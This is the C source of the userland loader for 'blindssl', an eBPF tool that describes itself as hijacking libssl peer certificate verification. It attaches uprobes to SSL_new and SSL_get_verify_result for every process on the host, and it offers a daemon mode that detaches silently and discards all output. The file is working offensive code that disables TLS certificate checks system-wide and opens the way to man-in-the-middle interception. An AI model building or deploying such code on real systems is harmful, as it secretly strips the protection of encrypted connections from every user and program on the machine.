#include <argp.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <bpf/libbpf.h>
#include <stdbool.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "blindssl.skel.h"
#include "blindssl_symbol.h"

const char header[] =
"";


const char *argp_program_version = "blindssl 0.1";
const char *argp_program_bug_address = "";
const char argp_program_doc[] =
"blindssl\n"
"\n"
"Uses eBPF to hijack libssl peer certificate verification\n"
"\n"
"USAGE: ./blinssl -p $(/usr/sbin/ldconfig -p | grep libssl.so | cut -d ' ' -f4) -d /var/log/trace.0\n";

/******************************************************************************/
/*!
 *  \brief   arguments
 */
static struct env {
    int verbose;    // will print more details of the execution
    int daemon;
    char* libssl_path;
} env;

/******************************************************************************/
static const struct argp_option opts[] = {
    { "path", 'p', "PATH", 0, "Path to the libssl.so file" },
    { "daemon", 'd', NULL, 1, "Start blindssl in daemon mode" },
    { "verbose", 'v', NULL, 1, "Verbose mode" },
    {},
};

/******************************************************************************/
/*!
 *  \brief  use to manage exit of the infinite loop
 */
static volatile sig_atomic_t exiting;

/******************************************************************************/
/*!
 *  signal handler
 */
void sig_int(int signo)
{
    exiting = 1;
}

/******************************************************************************/
/*!
 * \brief   print debug informations of libbpf
 */
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
    return vfprintf(stderr, format, args);
}

/******************************************************************************/
/*!
 *  \brief  parse arguments of the command line
 */
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'p':
        env.libssl_path = strdup(arg);
        break;
    case 'd':
        env.daemon = true;
        break;
    case 'v':
        env.verbose = true;
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

/******************************************************************************/
// parse args configuration
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

/******************************************************************************/
static bool bump_memlock_rlimit(void)
{
    struct rlimit rlim_new = 
    {
        .rlim_cur    = RLIM_INFINITY,
        .rlim_max    = RLIM_INFINITY,
    };

    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) 
    {
        return false;
    }
    return true;
}

/******************************************************************************/
static void start_daemon(void)
{
    pid_t child = fork();

    // error during fork
    if (child < 0)
    {
        exit(child);
    }

    // parent process
    if (child > 0)
    {
        exit(0);
    }

    // become the group leader
    setsid();

    child = fork();

    // error during fork
    if (child < 0)
    {
        exit(child);
    }

    // parent process
    if (child > 0)
    {
        exit(0);
    }

    umask(0);

    int chdir_flag = chdir("/tmp");
    if (chdir_flag != 0)
    {
        exit(1);
    }

    close(0);
    close(1);
    close(2);

    int fd_0 = open("/dev/null", O_RDWR);
    if (fd_0 != 0)
    {
        exit(1);
    }

    int fd_1 = dup(fd_0);
    if (fd_1 != 1)
    {
        exit(1);
    }

    int fd_2 = dup(fd_1);
    if (fd_2 != 2)
    {
        exit(1);
    }
}

/******************************************************************************/
int main(int argc, char **argv)
{
    struct blindssl_bpf *skel;
    int err;

    signal(SIGINT, sig_int);
    signal(SIGTERM, sig_int);

    env.verbose = false;
    env.daemon = false;
    env.libssl_path = NULL;

    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) 
    {
        return err;
    }

    if(env.libssl_path == NULL) 
    {
        fprintf(stderr, "blindssl: argument PATH is mandatory\n");
        exit(1);
    }

    int offset_ssl_new = blindssl_find_symbol_address(env.libssl_path, "SSL_new");

    if (offset_ssl_new == -1) 
    {
        fprintf(stderr, "blindssl: Unable to find SSL_new function in %s\n", env.libssl_path);
        exit(1);
    }

    int offset_ssl_get_verify_result = blindssl_find_symbol_address(env.libssl_path, "SSL_get_verify_result");

    if (offset_ssl_get_verify_result == -1) 
    {
        fprintf(stderr, "blindssl: Unable to find SSL_get_verify_result function in %s\n", env.libssl_path);
        exit(1);
    }

    // check deamon mode
    if (env.daemon)
    {
        start_daemon();
    }

    if(env.verbose)
        libbpf_set_print(libbpf_print_fn);


    if(!bump_memlock_rlimit())
    {
        fprintf(stderr, "blindssl: Failed to increase RLIMIT_MEMLOCK limit! (hint: run as root)\n");
        exit(1);
    }
 
    // Open BPF application 
    skel = blindssl_bpf__open();
    if (!skel) {
        fprintf(stderr, "blindssl: Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Load program
    err = blindssl_bpf__load( skel);
    if (err) {
        fprintf(stderr, "blindssl: Failed to load BPF program: %s\n", strerror(errno));
        goto cleanup;
    }
    
    // Attach userland probe 
    skel->links.change_verify_mode = bpf_program__attach_uprobe(
        skel->progs.change_verify_mode,
		false,           /* uprobe */
		-1,             /* any pid */
		env.libssl_path,       /* path to the lib*/
		offset_ssl_new
    );

    if(skel->links.change_verify_mode == NULL) {
        fprintf(stderr, "blindssl: Failed to link BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    skel->links.change_verify_result = bpf_program__attach_uprobe(
        skel->progs.change_verify_result,
		false,           /* uprobe */
		-1,             /* any pid */
		env.libssl_path,       /* path to the lib*/
		offset_ssl_get_verify_result
    );

    if(skel->links.change_verify_result == NULL) {
        fprintf(stderr, "blindssl: Failed to link BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    // keep eBPF programs loaded
    while (!exiting) {
        sleep(500);
    }

cleanup:
    blindssl_bpf__destroy( skel);
    return -err;
}
